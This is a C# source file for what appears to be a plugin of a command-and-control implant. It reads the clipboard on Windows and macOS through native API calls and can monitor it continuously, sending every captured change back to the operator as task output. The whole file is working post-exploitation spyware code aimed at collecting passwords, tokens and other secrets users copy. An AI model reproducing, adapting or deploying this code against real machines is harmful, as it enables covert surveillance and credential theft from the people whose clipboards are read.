using Workflow.Contracts;
using System.Text;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text.Json;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    static class WindowsClipboard
    {
        static void TryOpenClipboard()
        {
            var num = 10;
            while (true)
            {
                if (OpenClipboard(default))
                {
                    break;
                }

                if (--num == 0)
                {
                    ThrowWin32();
                }

                Thread.Sleep(100);
            }
        }

        public static string? GetText()
        {
            if (!IsClipboardFormatAvailable(cfUnicodeText))
            {
                return null;
            }
            TryOpenClipboard();

            return InnerGet();
        }

        static string? InnerGet()
        {
            IntPtr handle = default;

            IntPtr pointer = default;
            try
            {
                handle = GetClipboardData(cfUnicodeText);
                if (handle == default)
                {
                    return null;
                }

                pointer = GlobalLock(handle);
                if (pointer == default)
                {
                    return null;
                }

                var size = GlobalSize(handle);
                var buff = new byte[size];

                Marshal.Copy(pointer, buff, 0, size);

                return Encoding.Unicode.GetString(buff).TrimEnd('\0');
            }
            finally
            {
                if (pointer != default)
                {
                    GlobalUnlock(handle);
                }

                CloseClipboard();
            }
        }

        const uint cfUnicodeText = 13;

        static void ThrowWin32()
        {
            throw new Win32Exception(Marshal.GetLastWin32Error());
        }

        [DllImport("User32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsClipboardFormatAvailable(uint format);

        [DllImport("User32.dll", SetLastError = true)]
        static extern IntPtr GetClipboardData(uint uFormat);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GlobalLock(IntPtr hMem);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GlobalUnlock(IntPtr hMem);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenClipboard(IntPtr hWndNewOwner);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseClipboard();

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern int GlobalSize(IntPtr hMem);
    }

    static class OsxClipboard
    {
        static IntPtr nsString = objc_getClass("NSString");
        static IntPtr nsPasteboard = objc_getClass("NSPasteboard");
        static IntPtr nsStringPboardType;
        static IntPtr utfTextType;
        static IntPtr generalPasteboard;
        static IntPtr initWithUtf8Register =
            sel_registerName("initWithUTF8String:");
        static IntPtr allocRegister = sel_registerName("alloc");
        static IntPtr stringForTypeRegister =
            sel_registerName("stringForType:");
        static IntPtr utf8Register = sel_registerName("UTF8String");
        static IntPtr generalPasteboardRegister =
            sel_registerName("generalPasteboard");

        static OsxClipboard()
        {
            utfTextType = objc_msgSend(
                objc_msgSend(nsString, allocRegister),
                initWithUtf8Register, "public.utf8-plain-text");
            nsStringPboardType = objc_msgSend(
                objc_msgSend(nsString, allocRegister),
                initWithUtf8Register, "NSStringPboardType");
            generalPasteboard = objc_msgSend(
                nsPasteboard, generalPasteboardRegister);
        }

        public static string? GetText()
        {
            var ptr = objc_msgSend(
                generalPasteboard, stringForTypeRegister,
                nsStringPboardType);
            var charArray = objc_msgSend(ptr, utf8Register);
            return Marshal.PtrToStringAnsi(charArray);
        }

        [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
        static extern IntPtr objc_getClass(string className);

        [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
        static extern IntPtr objc_msgSend(
            IntPtr receiver, IntPtr selector);

        [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
        static extern IntPtr objc_msgSend(
            IntPtr receiver, IntPtr selector, string arg1);

        [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
        static extern IntPtr objc_msgSend(
            IntPtr receiver, IntPtr selector, IntPtr arg1);

        [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
        static extern IntPtr objc_msgSend(
            IntPtr receiver, IntPtr selector,
            IntPtr arg1, IntPtr arg2);

        [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
        static extern IntPtr sel_registerName(string selectorName);
    }

    public class Plugin : IModule
    {
        public string Name => "clipboard";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            var args = JsonSerializer.Deserialize<clipboard.ClipboardArgs>(
                job.task.parameters);

            if (args is null)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = "Failed to deserialize arguments.",
                    task_id = job.task.id,
                    status = "error"
                });
                return;
            }

            try
            {
                switch (args.action)
                {
                    case "get":
                        ExecuteGet(job);
                        break;
                    case "monitor":
                        await ExecuteMonitor(job, args);
                        break;
                    default:
                        messageManager.Write(
                            $"Unknown action: {args.action}",
                            job.task.id, true, "error");
                        break;
                }
            }
            catch (Exception e)
            {
                DebugLog.Log(
                    $"{Name} exception: {e.Message} [{job.task.id}]");
                messageManager.Write(
                    e.ToString(), job.task.id, true, "error");
            }
        }

        private void ExecuteGet(ServerJob job)
        {
            if (OperatingSystem.IsMacOS())
            {
                messageManager.Write(
                    OsxClipboard.GetText(), job.task.id, true);
            }
            else if (OperatingSystem.IsWindows())
            {
                messageManager.Write(
                    WindowsClipboard.GetText(), job.task.id, true);
            }
            else
            {
                messageManager.Write(
                    "Not implemented on this OS yet.",
                    job.task.id, true, "error");
            }
        }

        private async Task ExecuteMonitor(
            ServerJob job, clipboard.ClipboardArgs args)
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                messageManager.Write(
                    "Clipboard monitoring is only available on Windows",
                    job.task.id, true, "error");
                return;
            }

            int durationMs = args.duration * 1000;
            int intervalMs = args.interval * 1000;
            string lastContent = "";
            var entries = new List<Dictionary<string, string>>();
            var sw = System.Diagnostics.Stopwatch.StartNew();

            while (sw.ElapsedMilliseconds < durationMs)
            {
                try
                {
                    string current =
                        WindowsClipboard.GetText() ?? "";
                    if (!string.IsNullOrEmpty(current)
                        && current != lastContent)
                    {
                        entries.Add(new Dictionary<string, string>
                        {
                            ["timestamp"] =
                                DateTime.UtcNow.ToString("o"),
                            ["content"] = current
                        });
                        lastContent = current;

                        messageManager.Write(
                            $"[{DateTime.UtcNow:HH:mm:ss}] " +
                            $"New clipboard: {current}",
                            job.task.id, false);
                    }
                }
                catch { }

                await Task.Delay(intervalMs);
            }

            string summary = entries.Count > 0
                ? JsonSerializer.Serialize(entries,
                    new JsonSerializerOptions { WriteIndented = true })
                : "No clipboard changes detected";

            messageManager.AddTaskResponse(new TaskResponse
            {
                completed = true,
                user_output = summary,
                task_id = job.task.id
            });
        }
    }
}
